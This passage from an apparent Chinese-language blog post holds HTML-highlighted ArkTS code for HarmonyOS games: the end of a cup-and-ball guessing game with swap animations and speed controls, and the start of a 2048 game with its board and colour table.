游戏状态变量</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">gameCups</span>: <span class="title class_">Cup</span>[] = [<span class="comment">// 初始化三个杯子，其中一个有球</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Cup</span>(<span class="literal">true</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Cup</span>(<span class="literal">false</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Cup</span>(<span class="literal">false</span>)</span><br><span class="line">  ];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cupWidth</span>: number = <span class="number">200</span>; <span class="comment">// 杯子宽度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cupSpacing</span>: number = <span class="number">10</span>; <span class="comment">// 杯子之间的间距</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">animationDurationMs</span>: number = <span class="number">140</span>; <span class="comment">// 动画持续时间（毫秒）</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isGameAnimating</span>: boolean = <span class="literal">false</span>; <span class="comment">// 是否正在动画中</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">mixingCount</span>: number = <span class="number">5</span>; <span class="comment">// 每局游戏混合次数</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentMixingCount</span>: number = <span class="number">0</span>; <span class="comment">// 当前正在进行的混合次数计数</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 开始游戏的方法</span></span><br><span class="line">  <span class="title function_">startGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentMixingCount</span>--; <span class="comment">// 减少混合次数</span></span><br><span class="line">    <span class="keyword">const</span> cupPairs = [[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>]]; <span class="comment">// 可能的杯子对组合</span></span><br><span class="line">    <span class="keyword">const</span> selectedPair = cupPairs[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * cupPairs.<span class="property">length</span>)]; <span class="comment">// 随机选择一对</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">moveCups</span>(selectedPair[<span class="number">0</span>], selectedPair[<span class="number">1</span>]); <span class="comment">// 开始移动选定的两个杯子</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 移动指定的两个杯子</span></span><br><span class="line">  <span class="title function_">moveCups</span>(<span class="params">cupIndex1: number, cupIndex2: number</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">direction</span>: number = <span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.5</span> ? -<span class="number">1</span> : <span class="number">1</span>; <span class="comment">// 随机方向</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">distanceFactor</span>: number = <span class="title class_">Math</span>.<span class="title function_">abs</span>(cupIndex1 - cupIndex2); <span class="comment">// 距离因子</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">adjustedDistanceFactor</span>: number = distanceFactor === <span class="number">1</span> ? <span class="number">2</span> : <span class="number">1</span>; <span class="comment">// 根据距离调整因子</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionY</span> = -direction * (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) / adjustedDistanceFactor</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionX</span> = (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) * distanceFactor</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionY</span> = -direction * (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) / adjustedDistanceFactor</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> * <span class="number">2</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionX</span> = (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) * distanceFactor</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionY</span> = <span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionY</span> = direction * (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) / adjustedDistanceFactor</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionX</span> = -(<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) * distanceFactor</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionY</span> = direction * (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) / adjustedDistanceFactor</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> * <span class="number">2</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span>,</span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">swapBalls</span>(cupIndex1, cupIndex2)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionX</span> = -(<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) * distanceFactor</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionY</span> = <span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 重置杯子的位置</span></span><br><span class="line">  <span class="title function_">resetCupPosition</span>(<span class="params">cupIndex: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex].<span class="property">positionX</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex].<span class="property">positionY</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 交换两个杯子内的球</span></span><br><span class="line">  <span class="title function_">swapBalls</span>(<span class="params">cupIndex1: number, cupIndex2: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">resetCupPosition</span>(cupIndex1);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">resetCupPosition</span>(cupIndex2);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> temporaryBallStatus = <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">containsBall</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">containsBall</span> = <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">containsBall</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">containsBall</span> = temporaryBallStatus;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">currentMixingCount</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isGameAnimating</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">startGame</span>();</span><br><span class="line">      &#125;, <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建游戏界面</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">      <span class="comment">// 游戏标题</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&#x27;猜小球游戏&#x27;</span>)</span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">24</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 动画速度控制器</span></span><br><span class="line">      <span class="title class_">Counter</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`当前速度<span class="subst">$&#123;<span class="variable language_">this</span>.animationDurationMs&#125;</span>毫秒`</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="string">&#x27;26lpx&#x27;</span>);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;400lpx&#x27;</span>).<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> += <span class="number">10</span>;</span><br><span class="line">      &#125;).<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> -= <span class="number">10</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> = <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> &lt; <span class="number">10</span> ? <span class="number">10</span> : <span class="variable language_">this</span>.<span class="property">animationDurationMs</span>;</span><br><span class="line">      &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 混合次数控制器</span></span><br><span class="line">      <span class="title class_">Counter</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`每局混合<span class="subst">$&#123;<span class="variable language_">this</span>.mixingCount&#125;</span>次`</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="string">&#x27;26lpx&#x27;</span>);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;400lpx&#x27;</span>).<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">mixingCount</span> += <span class="number">1</span>;</span><br><span class="line">      &#125;).<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">mixingCount</span> -= <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">mixingCount</span> = <span class="variable language_">this</span>.<span class="property">mixingCount</span> &lt; <span class="number">1</span> ? <span class="number">1</span> : <span class="variable language_">this</span>.<span class="property">mixingCount</span></span><br><span class="line">      &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 杯子布局</span></span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">gameCups</span>, <span class="function">(<span class="params">cup: Cup</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Text</span>(cup.<span class="property">isRevealed</span> ? (cup.<span class="property">containsBall</span> ? <span class="string">&#x27;小球&#x27;</span> : <span class="string">&#x27;空&#x27;</span>) : <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cupWidth&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cupWidth&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cupSpacing&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cupWidth / <span class="number">4</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line">            .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="string">`<span class="subst">$&#123;cup.positionX&#125;</span>lpx`</span>, <span class="attr">y</span>: <span class="string">`<span class="subst">$&#123;cup.positionY&#125;</span>lpx`</span> &#125;)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isGameAnimating</span>) &#123;</span><br><span class="line">                cup.<span class="property">isRevealed</span> = <span class="literal">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;.<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;720lpx&#x27;</span>).<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Gray</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 开始游戏按钮</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;开始游戏&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isGameAnimating</span>) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">currentMixingCount</span> = <span class="variable language_">this</span>.<span class="property">mixingCount</span>;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isGameAnimating</span> = <span class="literal">true</span>;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">gameCups</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">cup</span> =&gt;</span> cup.<span class="property">isRevealed</span> = <span class="literal">false</span>);</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">startGame</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 使用装饰器标记Cell类，可能表示该类具有可观测性</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123;</span><br><span class="line">  <span class="comment">// 使用Trace装饰器标记value属性，可能表示该属性的变化会被追踪</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">value</span>: number;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构造函数初始化单元格的值为0</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 使用Entry和Component装饰器标记Game2048结构体，可能表示这是程序的入口点，并且该结构体定义了一个组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">  <span class="comment">// 定义Game2048结构体</span></span><br><span class="line">struct <span class="title class_">Game2048</span> &#123;</span><br><span class="line">  <span class="comment">// 使用State装饰器标记状态变量，可能表示这些变量是组件的状态</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">board</span>: <span class="title class_">Cell</span>[][] = []; <span class="comment">// 游戏盘面</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">score</span>: number = <span class="number">0</span>; <span class="comment">// 分数</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSize</span>: number = <span class="number">200</span>; <span class="comment">// 单元格大小</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellMargin</span>: number = <span class="number">5</span>; <span class="comment">// 单元格之间的边距</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">screenStartX</span>: number = <span class="number">0</span>; <span class="comment">// 触摸开始时的屏幕X坐标</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">screenStartY</span>: number = <span class="number">0</span>; <span class="comment">// 触摸开始时的屏幕Y坐标</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">lastScreenX</span>: number = <span class="number">0</span>; <span class="comment">// 触摸结束时的屏幕X坐标</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">lastScreenY</span>: number = <span class="number">0</span>; <span class="comment">// 触摸结束时的屏幕Y坐标</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 定义颜色数组</span></span><br><span class="line">  <span class="attr">colors</span>: string[] = [</span><br><span class="line">    <span class="string">&#x27;#CCCCCC&#x27;</span>, <span class="comment">// 0 - 灰色</span></span><br><span class="line">    <span class="string">&#x27;#FFC107&#x27;</span>, <span class="comment">// 2 - 黄色</span></span><br><span class="line">    <span class="string">&#x27;#FF9800&#x27;</span>, <span class="comment">// 4 - 橙色</span></span><br><span class="line">    <span class="string">&#x27;#FF5722&#x27;</span>, <span class="comment">// 8 - 深橙色</span></span><br><span class="line">    <span class="string">&#x27;#F44336&#x27;</span>, <span class="comment">// 16 - 红色</span></span><br><span class="line">    <span class="string">&#x27;#9C27B0&#x27;</span>, <span class="comment">// 32 - 紫色</span></span><br><span class="line">    <span class="string">&#x27;#3F51B5&#x27;</span>, <span class="comment">// 64 - 蓝紫色</span></span><br><span class="line">    <span class="string">&#x27;#00BCD4&#x27;</span>, <span class="comment">// 128 - 蓝色</span></span><br><span class="line">    <span class="string">&#x27;#009688&#x27;</span>, <span class="comment">// 256 - 深青色</span></span><br><span class="line">    <span class="string">&#x27;#4CAF50&#x27;</span>, <span class="comment">// 512 - 绿色</span></span><br><span class="line">    <span class="string">&#x27;#8BC34A&#x27;</span>, <span class="comment">// 1024 - 浅绿色</span></span><br><span class="line">    <span class="string">&#x27;#CDDC39&#x27;</span>, <span class="comment">// 2048 - 柠檬黄</span></span><br><span class="line">    <span class="string">&#x27;#FFEB3B&#x27;</span>, <span class="comment">// 4096 - 淡黄色</span></span><br><span class="line">    <span class="string">&#x27;#795548&#x27;</span>, <span class="comment">// 8192 - 棕色</span></span><br><span class="line">    <span class="string">&#x27;#607D8B&#x27;</span>, <span class="comment">// 16384 - 深灰色</span></span><br><span class="line">    <span class="string">&#x27;#9E9E9E&#x27;</span>, <span class="comment">// 32768 - 灰色</span></span><br><span class="line">    <span class="string">&#x27;#000000&#x27;</span> <span class="comment">// 以上 - 黑色</span></span><br><span class="line">  ];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 游戏即将出现时执行的方法</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">score</span> = <span class="number">0</span>; <span class="comment">// 重置分数</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initBoard</span>(); <span class="comment">// 重新初始化游戏板</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addRandomTiles</span>(<span class="number">2</span>); <span class="comment">// 添加两个随机方块</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 初始化游戏盘面</span></span><br><span class="line">  <span class="title function_">initBoard</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="attr">cellArr</span>: <span class="title class_">Cell</span>[] = [];</span><br><span class="line">        <span 